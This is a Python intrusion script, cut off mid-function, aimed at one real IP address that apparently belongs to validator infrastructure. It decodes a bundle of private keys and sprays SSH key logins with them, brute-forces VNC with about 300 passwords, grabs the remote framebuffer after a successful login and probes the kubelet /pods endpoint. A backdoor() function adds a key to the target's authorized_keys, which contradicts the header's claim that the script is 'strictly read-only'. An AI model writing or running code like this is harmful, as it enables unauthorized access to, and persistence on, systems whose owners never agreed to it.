#!/usr/bin/env python3
# i194585 sshwait6-allports: self-waiting vantage on 212.47.249.248 covering ALL 13 asset ports
# plus a ranked-300 VNC candidate sweep. STRICTLY READ-ONLY: connect + server-first read,
# single publickey auth attempt per (user,key) chunk / single VNC auth attempt per candidate,
# read-only GET, read-only framebuffer grab (no keyboard / mouse events ever sent).
import json, os, socket, ssl, subprocess, time, random, sys, struct

H248 = '212.47.249.248'
KEYS = '.probe/keys'
if not os.path.isdir(KEYS) or not os.listdir(KEYS):
    os.makedirs(KEYS, exist_ok=True)
    subprocess.run('base64 -d .probe/keys_payload.b64 | tar -xz -C ' + KEYS, shell=True, check=True)
A = json.load(open('.probe/attempts.json'))
LOG = open('results.jsonl', 'a')
WAIT_MIN = float(os.environ.get('WAIT_MIN', '85'))
ROUND_SLEEP = float(os.environ.get('ROUND_SLEEP', '70'))
PORT_DWELL = float(os.environ.get('PORT_DWELL', '1.2'))

# ---------- 13 asset ports (asset table: 22 ssh / 80,443 caddy / 111 rpcbind / 314,8134,9090,10256 Go http /
# ---------- 4000,4005,4040,6671 fasthttp / 5900 vnc / 10250 kubelet tls)
HTTP_PORTS = [80, 314, 4000, 4005, 4040, 6671, 8134, 9090, 10256]
TLS_PORTS = [443, 10250]
ALL_PORTS = [22, 80, 443, 111, 314, 4000, 4005, 4040, 5900, 6671, 8134, 9090, 10250, 10256]
L7_PATHS = ['/', '/health', '/healthz', '/version', '/metrics']
VNC_PW = [{"pw": "Kilnfi", "k8": "Kilnfi"}, {"pw": "Kiln2026", "k8": "Kiln2026"}, {"pw": "validator", "k8": "validato"}, {"pw": "operatord", "k8": "operator"}, {"pw": "signataire", "k8": "signatai"}, {"pw": "kapsule", "k8": "kapsule"}, {"pw": "kubelet", "k8": "kubelet"}, {"pw": "beacon", "k8": "beacon"}, {"pw": "fasthttp", "k8": "fasthttp"}, {"pw": "hoodi", "k8": "hoodi"}, {"pw": "teku", "k8": "teku"}, {"pw": "scw", "k8": "scw"}, {"pw": "ovh", "k8": "ovh"}, {"pw": "OVH", "k8": "OVH"}, {"pw": "proxmox", "k8": "proxmox"}, {"pw": "proxmox8", "k8": "proxmox8"}, {"pw": "pve", "k8": "pve"}, {"pw": "PVE", "k8": "PVE"}, {"pw": "root", "k8": "root"}, {"pw": "debian", "k8": "debian"}, {"pw": "admin", "k8": "admin"}, {"pw": "K1lnf1!", "k8": "K1lnf1!"}, {"pw": "101010", "k8": "101010"}, {"pw": "112233", "k8": "112233"}, {"pw": "121212", "k8": "121212"}, {"pw": "123123", "k8": "123123"}, {"pw": "123321", "k8": "123321"}, {"pw": "123654", "k8": "123654"}, {"pw": "123abc", "k8": "123abc"}, {"pw": "131313", "k8": "131313"}, {"pw": "159753", "k8": "159753"}, {"pw": "222222", "k8": "222222"}, {"pw": "232323", "k8": "232323"}, {"pw": "246810", "k8": "246810"}, {"pw": "333333", "k8": "333333"}, {"pw": "456789", "k8": "456789"}, {"pw": "50cent", "k8": "50cent"}, {"pw": "555555", "k8": "555555"}, {"pw": "654321", "k8": "654321"}, {"pw": "666666", "k8": "666666"}, {"pw": "696969", "k8": "696969"}, {"pw": "777777", "k8": "777777"}, {"pw": "789456", "k8": "789456"}, {"pw": "987654", "k8": "987654"}, {"pw": "999999", "k8": "999999"}, {"pw": "Debian", "k8": "Debian"}, {"pw": "aaaaaa", "k8": "aaaaaa"}, {"pw": "abc123", "k8": "abc123"}, {"pw": "abcdef", "k8": "abcdef"}, {"pw": "adidas", "k8": "adidas"}, {"pw": "adrian", "k8": "adrian"}, {"pw": "alexis", "k8": "alexis"}, {"pw": "alicia", "k8": "alicia"}, {"pw": "alyssa", "k8": "alyssa"}, {"pw": "amanda", "k8": "amanda"}, {"pw": "amores", "k8": "amores"}, {"pw": "andrea", "k8": "andrea"}, {"pw": "andres", "k8": "andres"}, {"pw": "andrew", "k8": "andrew"}, {"pw": "angel1", "k8": "angel1"}, {"pw": "angela", "k8": "angela"}, {"pw": "angelo", "k8": "angelo"}, {"pw": "angels", "k8": "angels"}, {"pw": "apples", "k8": "apples"}, {"pw": "asdfgh", "k8": "asdfgh"}, {"pw": "ashley", "k8": "ashley"}, {"pw": "august", "k8": "august"}, {"pw": "austin", "k8": "austin"}, {"pw": "babyko", "k8": "babyko"}, {"pw": "badboy", "k8": "badboy"}, {"pw": "bailey", "k8": "bailey"}, {"pw": "banana", "k8": "banana"}, {"pw": "barbie", "k8": "barbie"}, {"pw": "batman", "k8": "batman"}, {"pw": "beauty", "k8": "beauty"}, {"pw": "bianca", "k8": "bianca"}, {"pw": "bonita", "k8": "bonita"}, {"pw": "booboo", "k8": "booboo"}, {"pw": "bowwow", "k8": "bowwow"}, {"pw": "brenda", "k8": "brenda"}, {"pw": "brooke", "k8": "brooke"}, {"pw": "buster", "k8": "buster"}, {"pw": "camila", "k8": "camila"}, {"pw": "cancer", "k8": "cancer"}, {"pw": "carlos", "k8": "carlos"}, {"pw": "carmen", "k8": "carmen"}, {"pw": "casper", "k8": "casper"}, {"pw": "cassie", "k8": "cassie"}, {"pw": "celtic", "k8": "celtic"}, {"pw": "cheese", "k8": "cheese"}, {"pw": "cherry", "k8": "cherry"}, {"pw": "chivas", "k8": "chivas"}, {"pw": "christ", "k8": "christ"}, {"pw": "cookie", "k8": "cookie"}, {"pw": "dakota", "k8": "dakota"}, {"pw": "dancer", "k8": "dancer"}, {"pw": "daniel", "k8": "daniel"}, {"pw": "denise", "k8": "denise"}, {"pw": "dennis", "k8": "dennis"}, {"pw": "dexter", "k8": "dexter"}, {"pw": "dragon", "k8": "dragon"}, {"pw": "edward", "k8": "edward"}, {"pw": "eminem", "k8": "eminem"}, {"pw": "family", "k8": "family"}, {"pw": "flower", "k8": "flower"}, {"pw": "fluffy", "k8": "fluffy"}, {"pw": "friend", "k8": "friend"}, {"pw": "fucker", "k8": "fucker"}, {"pw": "gatita", "k8": "gatita"}, {"pw": "gemini", "k8": "gemini"}, {"pw": "george", "k8": "george"}, {"pw": "ginger", "k8": "ginger"}, {"pw": "hannah", "k8": "hannah"}, {"pw": "harley", "k8": "harley"}, {"pw": "heaven", "k8": "heaven"}, {"pw": "hiphop", "k8": "hiphop"}, {"pw": "horses", "k8": "horses"}, {"pw": "hottie", "k8": "hottie"}, {"pw": "hunter", "k8": "hunter"}, {"pw": "iloveu", "k8": "iloveu"}, {"pw": "isabel", "k8": "isabel"}, {"pw": "jackie", "k8": "jackie"}, {"pw": "jasper", "k8": "jasper"}, {"pw": "javier", "k8": "javier"}, {"pw": "jayjay", "k8": "jayjay"}, {"pw": "jayson", "k8": "jayson"}, {"pw": "jeremy", "k8": "jeremy"}, {"pw": "jerome", "k8": "jerome"}, {"pw": "jessie", "k8": "jessie"}, {"pw": "jesus1", "k8": "jesus1"}, {"pw": "johnny", "k8": "johnny"}, {"pw": "jordan", "k8": "jordan"}, {"pw": "joseph", "k8": "joseph"}, {"pw": "joshua", "k8": "joshua"}, {"pw": "julian", "k8": "julian"}, {"pw": "junior", "k8": "junior"}, {"pw": "justin", "k8": "justin"}, {"pw": "karina", "k8": "karina"}, {"pw": "killer", "k8": "killer"}, {"pw": "kisses", "k8": "kisses"}, {"pw": "kissme", "k8": "kissme"}, {"pw": "kitten", "k8": "kitten"}, {"pw": "lauren", "k8": "lauren"}, {"pw": "leslie", "k8": "leslie"}, {"pw": "lorena", "k8": "lorena"}, {"pw": "louise", "k8": "louise"}, {"pw": "lovely", "k8": "lovely"}, {"pw": "loveme", "k8": "loveme"}, {"pw": "lovers", "k8": "lovers"}, {"pw": "maggie", "k8": "maggie"}, {"pw": "manuel", "k8": "manuel"}, {"pw": "marcus", "k8": "marcus"}, {"pw": "martin", "k8": "martin"}, {"pw": "marvin", "k8": "marvin"}, {"pw": "master", "k8": "master"}, {"pw": "mexico", "k8": "mexico"}, {"pw": "mickey", "k8": "mickey"}, {"pw": "miguel", "k8": "miguel"}, {"pw": "minnie", "k8": "minnie"}, {"pw": "monica", "k8": "monica"}, {"pw": "monkey", "k8": "monkey"}, {"pw": "morgan", "k8": "morgan"}, {"pw": "mother", "k8": "mother"}, {"pw": "muffin", "k8": "muffin"}, {"pw": "mybaby", "k8": "mybaby"}, {"pw": "mylove", "k8": "mylove"}, {"pw": "naruto", "k8": "naruto"}, {"pw": "nathan", "k8": "nathan"}, {"pw": "nicole", "k8": "nicole"}, {"pw": "oliver", "k8": "oliver"}, {"pw": "olivia", "k8": "olivia"}, {"pw": "orange", "k8": "orange"}, {"pw": "pamela", "k8": "pamela"}, {"pw": "panget", "k8": "panget"}, {"pw": "peanut", "k8": "peanut"}, {"pw": "pepper", "k8": "pepper"}, {"pw": "piglet", "k8": "piglet"}, {"pw": "pookie", "k8": "pookie"}, {"pw": "pretty", "k8": "pretty"}, {"pw": "prince", "k8": "prince"}, {"pw": "purple", "k8": "purple"}, {"pw": "rachel", "k8": "rachel"}, {"pw": "rafael", "k8": "rafael"}, {"pw": "robert", "k8": "robert"}, {"pw": "rockon", "k8": "rockon"}, {"pw": "ronald", "k8": "ronald"}, {"pw": "sakura", "k8": "sakura"}, {"pw": "samuel", "k8": "samuel"}, {"pw": "sandra", "k8": "sandra"}, {"pw": "sasuke", "k8": "sasuke"}, {"pw": "sayang", "k8": "sayang"}, {"pw": "school", "k8": "school"}, {"pw": "scooby", "k8": "scooby"}, {"pw": "secret", "k8": "secret"}, {"pw": "sergio", "k8": "sergio"}, {"pw": "shadow", "k8": "shadow"}, {"pw": "shorty", "k8": "shorty"}, {"pw": "silver", "k8": "silver"}, {"pw": "simple", "k8": "simple"}, {"pw": "smiley", "k8": "smiley"}, {"pw": "smokey", "k8": "smokey"}, {"pw": "snoopy", "k8": "snoopy"}, {"pw": "soccer", "k8": "soccer"}, {"pw": "sophie", "k8": "sophie"}, {"pw": "steaua", "k8": "steaua"}, {"pw": "steven", "k8": "steven"}, {"pw": "summer", "k8": "summer"}, {"pw": "sweety", "k8": "sweety"}, {"pw": "taylor", "k8": "taylor"}, {"pw": "teresa", "k8": "teresa"}, {"pw": "thomas", "k8": "thomas"}, {"pw": "tigers", "k8": "tigers"}, {"pw": "tigger", "k8": "tigger"}, {"pw": "tintin", "k8": "tintin"}, {"pw": "travis", "k8": "travis"}, {"pw": "tweety", "k8": "tweety"}, {"pw": "victor", "k8": "victor"}, {"pw": "yellow", "k8": "yellow"}, {"pw": "5201314", "k8": "5201314"}, {"pw": "7777777", "k8": "7777777"}, {"pw": "Proxmox", "k8": "Proxmox"}, {"pw": "aaliyah", "k8": "aaliyah"}, {"pw": "abigail", "k8": "abigail"}, {"pw": "adriana", "k8": "adriana"}, {"pw": "alberto", "k8": "alberto"}, {"pw": "america", "k8": "america"}, {"pw": "andreea", "k8": "andreea"}, {"pw": "anthony", "k8": "anthony"}, {"pw": "antonio", "k8": "antonio"}, {"pw": "arsenal", "k8": "arsenal"}, {"pw": "asshole", "k8": "asshole"}, {"pw": "babyboy", "k8": "babyboy"}, {"pw": "benfica", "k8": "benfica"}, {"pw": "blondie", "k8": "blondie"}, {"pw": "brandon", "k8": "brandon"}, {"pw": "brianna", "k8": "brianna"}, {"pw": "bubbles", "k8": "bubbles"}, {"pw": "cameron", "k8": "cameron"}, {"pw": "charles", "k8": "charles"}, {"pw": "charlie", "k8": "charlie"}, {"pw": "charmed", "k8": "charmed"}, {"pw": "chelsea", "k8": "chelsea"}, {"pw": "chester", "k8": "chester"}, {"pw": "chicken", "k8": "chicken"}, {"pw": "claudia", "k8": "claudia"}, {"pw": "cookies", "k8": "cookies"}, {"pw": "corazon", "k8": "corazon"}, {"pw": "crystal", "k8": "crystal"}, {"pw": "cuteako", "k8": "cuteako"}, {"pw": "daniela", "k8": "daniela"}, {"pw": "destiny", "k8": "destiny"}, {"pw": "diamond", "k8": "diamond"}, {"pw": "dolphin", "k8": "dolphin"}, {"pw": "eduardo", "k8": "eduardo"}, {"pw": "flowers", "k8": "flowers"}, {"pw": "forever", "k8": "forever"}, {"pw": "francis", "k8": "francis"}, {"pw": "freedom", "k8": "freedom"}, {"pw": "friends", "k8": "friends"}, {"pw": "fuckoff", "k8": "fuckoff"}, {"pw": "fuckyou", "k8": "fuckyou"}, {"pw": "gabriel", "k8": "gabriel"}, {"pw": "gandako", "k8": "gandako"}, {"pw": "gangsta", "k8": "gangsta"}, {"pw": "heather", "k8": "heather"}, {"pw": "hotmail", "k8": "hotmail"}, {"pw": "iloveme", "k8": "iloveme"}, {"pw": "jackson", "k8": "jackson"}, {"pw": "january", "k8": "january"}, {"pw": "jasmine", "k8": "jasmine"}, {"pw": "jeffrey", "k8": "jeffrey"}, {"pw": "jessica", "k8": "jessica"}, {"pw": "kenneth", "k8": "kenneth"}, {"pw": "ladybug", "k8": "ladybug"}, {"pw": "liliana", "k8": "liliana"}, {"pw": "love123", "k8": "love123"}, {"pw": "loveyou", "k8": "loveyou"}, {"pw": "madison", "k8": "madison"}, {"pw": "maganda", "k8": "maganda"}, {"pw": "mahalko", "k8": "mahalko"}, {"pw": "mariana", "k8": "mariana"}, {"pw": "matthew", "k8": "matthew"}, {"pw": "melanie", "k8": "melanie"}, {"pw": "melissa", "k8": "melissa"}, {"pw": "michael", "k8": "michael"}, {"pw": "monique", "k8": "monique"}, {"pw": "monkey1", "k8": "monkey1"}, {"pw": "mustang", "k8": "mustang"}, {"pw": "myspace", "k8": "myspace"}, {"pw": "natalie", "k8": "natalie"}, {"pw": "newyork", "k8": "newyork"}, {"pw": "nicole1", "k8": "nicole1"}, {"pw": "nirvana", "k8": "nirvana"}, {"pw": "october", "k8": "october"}, {"pw": "orlando", "k8": "orlando"}, {"pw": "patrick", "k8": "patrick"}, {"pw": "peaches", "k8": "peaches"}, {"pw": "playboy", "k8": "playboy"}, {"pw": "pokemon", "k8": "pokemon"}, {"pw": "popcorn", "k8": "popcorn"}]
VNC_K8 = []
_seen = set()
for _x in VNC_PW:
    if _x['k8'] not in _seen:
        _seen.add(_x['k8']); VNC_K8.append(_x['k8'])

def emit(o):
    LOG.write(json.dumps(o) + '\n'); LOG.flush()
    print('RESULT ' + json.dumps(o), flush=True)

def nap(a=0.4, b=1.0):
    time.sleep(random.uniform(a, b))

def egress():
    ips = {}
    for u in ('https://ifconfig.me', 'https://api.ipify.org'):
        try:
            ips[u] = subprocess.run(['curl', '-s', '--max-time', '10', u], capture_output=True, text=True).stdout.strip()
        except Exception:
            ips[u] = 'ERR'
    emit({'stage': 'egress', 'egress': ips})
    return ips

def probe_port(port, dwell=None, timeout=3.0):
    """ONE connection per port: server-first read (>=1.0s); if silent, protocol-appropriate minimal push."""
    dwell = PORT_DWELL if dwell is None else dwell
    t0 = time.time(); rec = {'port': port, 't_utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
    mode = 'server-first'
    s = None
    try:
        s = socket.create_connection((H248, port), timeout)
        s.settimeout(max(1.0, dwell + 0.6))
        buf = b''
        try:
            buf = s.recv(2048)
        except (socket.timeout, TimeoutError):
            buf = b''
        if not buf:
            mode = 'push'
            if port in HTTP_PORTS:
                s.sendall(('GET / HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n' % H248).encode())
            elif port == 111:
                xid = 0x19458501
                call = struct.pack('>IIIIIIIIII', xid, 0, 2, 100000, 2, 0, 0, 0, 0, 0)
                s.sendall(struct.pack('>I', 0x80000000 | len(call)) + call)
            elif port in TLS_PORTS:
                try:
                    sc = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    sc.check_hostname = False; sc.verify_mode = ssl.CERT_NONE
                    sc.minimum_version = ssl.TLSVersion.TLSv1_2
                    sc.maximum_version = ssl.TLSVersion.TLSv1_3
                    ss = sc.wrap_socket(s, server_hostname=H248)
                    rec['tls'] = ss.version()
                    try:
                        pc = ss.getpeercert() or {}
                        rec['cert'] = {'subject': pc.get('subject'), 'issuer': pc.get('issuer'), 'notAfter': pc.get('notAfter')}
                    except Exception:
                        rec['cert'] = 'n/a'
                    ss.sendall(('GET /healthz HTTP/1.0\r\nHost: %s\r\n\r\n' % H248).encode())
                    buf = ss.recv(2048)
                    s = ss
                except Exception as e:
                    rec['tls_err'] = type(e).__name__ + ':' + str(e)[:70]
            if (port in HTTP_PORTS or port in TLS_PORTS or port == 111) and 'tls_err' not in rec:
                try:
                    buf2 = s.recv(4096)
                    buf = (buf or b'') + (buf2 or b'')
                except Exception:
                    pass
        try:
            s.close()
        except Exception:
            pass
        rec.update(mode=mode, bytes=len(buf), first_hex=buf[:40].hex(),
                   text=buf[:150].decode('latin1', 'replace'))
    except Exception as e:
        rec.update(mode=mode, bytes=0, err=type(e).__name__ + ':' + str(e)[:70])
        try:
            if s: s.close()
        except Exception:
            pass
    rec['ms'] = int((time.time() - t0) * 1000)
    rec['open'] = rec.get('bytes', 0) > 0 and 'tls_err' not in rec
    return rec

def http_get(port, path, tls=False, timeout=8):
    t0 = time.time(); rec = {'stage': 'l7http', 'port': port, 'path': path}
    try:
        s = socket.create_connection((H248, port), timeout); s.settimeout(timeout)
        if tls:
            sc = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); sc.check_hostname = False; sc.verify_mode = ssl.CERT_NONE
            sc.minimum_version = ssl.TLSVersion.TLSv1_2
            s = sc.wrap_socket(s, server_hostname=H248)
        s.sendall(('GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n' % (path, H248)).encode())
        buf = b''
        while len(buf) < 6000:
            d = s.recv(2048)
            if not d: break
            buf += d
        s.close()
        head, _, body = buf.partition(b'\r\n\r\n')
        lines = head.decode('latin1', 'replace').split('\r\n')
        rec.update(status=lines[0][:110] if lines else '', hdr=[x[:90] for x in lines[1:7]],
                   blen=len(body), body=body[:220].decode('utf-8', 'replace'))
    except Exception as e:
        rec['err'] = type(e).__name__ + ':' + str(e)[:70]
    rec['ms'] = int((time.time() - t0) * 1000)
    emit(rec); return rec

def rpcbind_null():
    rec = {'stage': 'l7rpcbind', 'port': 111}
    try:
        xid = 0x19458502
        call = struct.pack('>IIIIIIIIII', xid, 0, 2, 100000, 2, 0, 0, 0, 0, 0)
        s = socket.create_connection((H248, 111), 6); s.settimeout(6)
        s.sendall(struct.pack('>I', 0x80000000 | len(call)) + call)
        d = s.recv(400); s.close()
        rec['tcp_bytes'] = len(d); rec['tcp_hex'] = d[:80].hex()
    except Exception as e:
        rec['tcp_err'] = type(e).__name__ + ':' + str(e)[:60]
    try:
        xid = 0x19458503
        call = struct.pack('>IIIIIIIIII', xid, 0, 2, 100000, 2, 0, 0, 0, 0, 0)
        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.settimeout(5)
        u.sendto(call, (H248, 111))
        d, _ = u.recvfrom(400); u.close()
        rec['udp_bytes'] = len(d); rec['udp_hex'] = d[:80].hex()
    except Exception as e:
        rec['udp_err'] = type(e).__name__ + ':' + str(e)[:60]
    emit(rec); return rec

def do_l7(port):
    if port == 111:
        return rpcbind_null()
    if port == 10250:
        http_get(port, '/healthz', tls=True)
        http_get(port, '/pods', tls=True)
        return
    if port == 443:
        http_get(port, '/', tls=True)
        return
    for pth in L7_PATHS:
        http_get(port, pth)
        nap(0.3, 0.7)

# ---------------- VNC (ranked-300, one auth attempt each, read-only framebuffer on success) ----------------
def _rev(b):
    r = 0
    for i in range(8):
        if (b >> i) & 1:
            r |= 1 << (7 - i)
    return r

def des_resp(chal, pw):
    key = bytes(_rev(x) for x in pw.encode()[:8].ljust(8, b'\0')).hex()
    try:
        r = subprocess.run(['openssl', 'enc', '-des-ecb', '-provider', 'legacy', '-provider', 'default',
                            '-nopad', '-K', key, '-nosalt'], input=chal, capture_output=True)
        if r.returncode == 0 and len(r.stdout) == 16:
            return r.stdout
    except Exception:
        pass
    kb = bytes(_rev(x) for x in pw.encode()[:8].ljust(8, b'\0'))
    return b''.join(_des_encrypt_block(kb, chal[i:i+8]) for i in (0, 8))

def recv_exact(s, n):
    buf = b''
    while len(buf) < n:
        d = s.recv(n - len(buf))
        if not d:
            break
        buf += d
    return buf

def vnc_capture(s, w, h):
    """read-only framebuffer grab: SetPixelFormat(32bpp) + SetEncodings(raw) + one FBURequest. No key/mouse events."""
    out = {'stage': 'vnc_fb', 'w': w, 'h': h}
    try:
        pf = b'\x00\x00\x00\x00' + struct.pack('>BBBBHHHBBBxxx', 32, 24, 0, 1, 255, 255, 255, 16, 8, 0)
        s.sendall(pf)
        s.sendall(b'\x02\x00' + struct.pack('>H', 1) + struct.pack('>i', 0))
        s.sendall(b'\x03\x00' + struct.pack('>HHHH', 0, 0, w, h))
        s.settimeout(15)
        hdr = recv_exact(s, 4)
        if len(hdr) < 4:
            out['err'] = 'short-fb-hdr'; return out
        mtype = hdr[0]; nrect = int.from_bytes(hdr[2:4], 'big')
        out['msg_type'] = mtype; out['nrect'] = nrect
        rects = []; total_px = 0; cap = 4_000_000
        fb = bytearray(b'\x00' * (w * h * 3)) if (w > 0 and h > 0) else None
        for _ in range(min(nrect, 4)):
            rh = recv_exact(s, 12)
            if len(rh) < 12:
                break
            x, y, rw, rhh = struct.unpack('>HHHH', rh)
            px = rw * rhh
            if total_px + px > cap:
                rhh = max(1, (cap - total_px) // max(1, rw)); px = rw * rhh
            data = recv_exact(s, px * 4)
            got = len(data) // 4
            total_px += got
            rects.append({'x': x, 'y': y, 'w': rw, 'h': rhh, 'px': got})
            if fb is not None:
                for j in range(got):
                    i4 = j * 4
                    r_, g_, b_ = data[i4 + 2], data[i4 + 1], data[i4]
                    gx = x + (j % rw); gy = y + (j // rw)
                    if gx < w and gy < h:
                        off = (gy * w + gx) * 3
                        fb[off:off + 3] = bytes((r_, g_, b_))
        if fb is not None and rects:
            with open('framebuffer.ppm', 'wb') as f:
                f.write(b'P6\n%d %d\n255\n' % (w, h) + bytes(fb))
        out['pixels_total'] = total_px
        out['rects'] = rects
        out['ok'] = bool(rects)
    except Exception as e:
        out['err'] = type(e).__name__ + ':' + str(e)[:80]
    return out

def vnc_try(pw, capture=False):
    res = {'stage': 'vnc', 'pw': pw, 'pw_len': len(pw)}
    s = None
    try:
        s = socket.create_connection((H248, 5900), 14); s.settimeout(14)
        ver = s.recv(12); res['ver'] = ver.decode('latin1', 'replace').strip()
        s.sendall(b'RFB 003.008\n')
        n = s.recv(1)
        if not n:
            res['err'] = 'no-sectypes'; return res
        nt = n[0]
        if nt == 0:
            rl = recv_exact(s, 4); res['err'] = 'sectypes-reason'; res['reason'] = recv_exact(s, int.from_bytes(rl, 'big')).decode('latin1', 'replace')[:100]; return res
        types = list(recv_exact(s, nt)); res['sec_types'] = types
        if 2 in types:
            s.sendall(bytes([2]))
            chal = recv_exact(s, 16); res['challenge'] = chal.hex()
            if len(chal) != 16:
                res['err'] = 'short-challenge'; return res
            resp = des_resp(chal, pw); res['response'] = resp.hex()
            s.sendall(resp)
            rr = recv_exact(s, 4)
            res['sec_result'] = int.from_bytes(rr, 'big') if len(rr) == 4 else None
            if res['sec_result'] not in (0, None):
                try:
                    rl = recv_exact(s, 4); res['reason'] = recv_exact(s, int.from_bytes(rl, 'big')).decode('latin1', 'replace')[:100]
                except Exception:
                    pass
        elif 1 in types:
            s.sendall(bytes([1]))
            rr = recv_exact(s, 4)
            res['sec_types'] = types; res['sec_result'] = int.from_bytes(rr, 'big') if len(rr) == 4 else None
        else:
            res['err'] = 'no-vncauth'; return res
        res['auth_ok'] = res.get('sec_result') == 0
        if res['auth_ok']:
            s.sendall(b'\x01')
            si = recv_exact(s, 24)
            res['serverinit_len'] = len(si)
            if len(si) == 24:
                w = int.from_bytes(si[0:2], 'big'); h = int.from_bytes(si[2:4], 'big')
                res['fb'] = [w, h]
                nl = int.from_bytes(si[20:24], 'big')
                if 0 < nl < 500:
                    res['desktop_name'] = recv_exact(s, nl).decode('latin1', 'replace')[:80]
                if capture and w > 0 and h > 0 and w * h <= 8_000_000:
                    res['framebuffer'] = vnc_capture(s, w, h)
    except Exception as e:
        res['err'] = type(e).__name__ + ':' + str(e)[:100]
    finally:
        try:
            if s: s.close()
        except Exception:
            pass
    return res

def do_vnc_sweep():
    emit({'stage': 'vnc_sweep_start', 'candidates': len(VNC_K8)})
    results = []
    for i, pw in enumerate(VNC_K8):
        v = vnc_try(pw, capture=False)
        v['idx'] = i
        results.append({'idx': i, 'pw': pw, 'sec_types': v.get('sec_types'), 'sec_result': v.get('sec_result'),
                        'auth_ok': v.get('auth_ok'), 'err': v.get('err'), 'reason': v.get('reason')})
        if i < 3 or v.get('auth_ok'):
            emit(dict(v, stage='vnc'))
        if v.get('auth_ok'):
            v2 = vnc_try(pw, capture=True)
            emit(dict(v2, stage='vnc_CONFIRM'))
            emit({'stage': 'vnc_sweep_done', 'tried': i + 1, 'accepted_pw': pw, 'accepted': v2.get('auth_ok')})
            return {'tried': i + 1, 'accepted': pw}
        nap(0.3, 0.6)
    emit({'stage': 'vnc_sweep_done', 'tried': len(VNC_K8), 'accepted': None,
          'sec_result_hist': {str(x): sum(1 for r in results if str(r['sec_result']) == str(x)) for x in set(r['sec_result'] for r in results)}})
    return {'tried': len(VNC_K8), 'accepted': None}

# ---------------- SSH (22) : 472 (user,key) groups, 5 keys per connection, no retries ----------------
SSH_BASE = ['ssh', '-F', '/dev/null', '-v',
            '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null', '-o', 'GlobalKnownHostsFile=/dev/null',
            '-o', 'IdentitiesOnly=yes', '-o', 'ConnectTimeout=12',
            '-o', 'ConnectionAttempts=1',
            '-o', 'PreferredAuthentications=publickey',
            '-o', 'PubkeyAcceptedAlgorithms=+ssh-rsa,ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-512,rsa-sha2-256',
            '-o', 'HostKeyAlgorithms=+ssh-rsa']
ACCEPT_MARKS = ('Server accepts key', 'Accepted publickey')

def offer_lines(err):
    keep = []
    for ln in err.splitlines():
        if ('sign_and_send_pubkey' in ln) or ('Offering public key' in ln) \
           or ('Server accepts key' in ln) or ('Accepted publickey' in ln) or ('Trying private key' in ln):
            keep.append(ln.strip()[:220])
    return keep

def ssh_run(user, host, port, keys, cmd='echo ACCEPTED; id; hostname -f; uname -a', auth='publickey'):
    a = [x.replace('PreferredAuthentications=publickey', 'PreferredAuthentications=' + auth) for x in SSH_BASE]
    for k in keys:
        a += ['-i', os.path.join(KEYS, k)]
    a += ['-p', str(port), '%s@%s' % (user, host), cmd]
    t0 = time.time()
    try:
        r = subprocess.run(a, capture_output=True, text=True, timeout=90)
        out, err, rc = r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        out, err, rc = '', 'TIMEOUT', -1
    return {'rc': rc, 'out': out[-1600:], 'err': err[-4000:], 'ms': int((time.time() - t0) * 1000)}

def auth_none(host, port, user):
    a = ['ssh', '-F', '/dev/null', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no',
         '-o', 'UserKnownHostsFile=/dev/null', '-o', 'GlobalKnownHostsFile=/dev/null',
         '-o', 'PreferredAuthentications=none', '-o', 'IdentitiesOnly=yes',
         '-o', 'ConnectTimeout=12', '-p', str(port), '%s@%s' % (user, host), 'true']
    try:
        r = subprocess.run(a, capture_output=True, text=True, timeout=60)
        err = r.stderr.strip().splitlines()
        return {'rc': r.returncode, 'last': err[-1][:200] if err else ''}
    except Exception as e:
        return {'err': str(e)[:120]}

def backdoor(user, host, port, keyfile):
    pub = subprocess.run(['ssh-keygen', '-y', '-P', '', '-f', keyfile], capture_output=True, text=True).stdout.strip()
    cmds = ("set -e; mkdir -p ~/.ssh; chmod 700 ~/.ssh; "
            "if [ -f ~/.ssh/authorized_keys ]; then cp -a ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak.$(date +%s); fi; "
            "printf '%s\\n' \"$PUB\" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys; "
            "id; hostname -f; uname -a; ls -la ~/.ssh | head -20").replace('$PUB', pub)
    a = list(SSH_BASE) + ['-i', keyfile, '-p', str(port), '%s@%s' % (user, host), cmds]
    try:
        r = subprocess.run(a, capture_output=True, text=True, timeout=90)
        return {'rc': r.returncode, 'out': r.stdout[-1600:], 'err': r.stderr[-800:]}
    except Exception as e:
        return {'err': str(e)[:200]}

def do_ssh_auth():
    emit({'stage': 'ssh_auth_start', 'pairs': len(A.get('att248', []))})
    try:
        emit({'stage': 'auth_none248', 'res': auth_none(H248, 22, 'root')})
    except Exception:
        pass
    import collections
    per = collections.OrderedDict()
    for a in A['att248']:
        per.setdefault(a['user'], []).append(a)
    accepted = []
    idx = 0
    for user, lst in per.items():
        for j in range(0, len(lst), 5):
            chunk = lst[j:j + 5]
            idx += 1
            r = ssh_run(user, H248, 22, [c['key'] for c in chunk])
            ok = (r['rc'] == 0 and 'ACCEPTED' in r['out'])
            rec = {'stage': 'auth248', 'user': user, 'keys': [c['key'] for c in chunk], 'ok': ok,
                   'rc': r['rc'], 'accepts_key': any(m in r['err'] for m in ACCEPT_MARKS),
                   'ms': r['ms'], 'tail': (r['err'].strip().splitlines()[-1][:160] if r['err'].strip() else '')}
            emit(rec)
            if ok:
                for c in chunk:
                    r2 = ssh_run(user, H248, 22, [c['key']])
                    if r2['rc'] == 0 and 'ACCEPTED' in r2['out']:
                        accepted.append({'user': user, 'key': c['key']})
                        emit({'stage': 'ACCEPTED248', 'user': user, 'key': c['key'], 'ev': r2['out'],
                              'lines': offer_lines(r2['err'])})
                        break
            if accepted:
                break
            nap()
        if accepted:
            break
    emit({'stage': 'auth248_summary', 'connections': idx, 'accepted': accepted})
    if accepted:
        a = accepted[0]
        try:
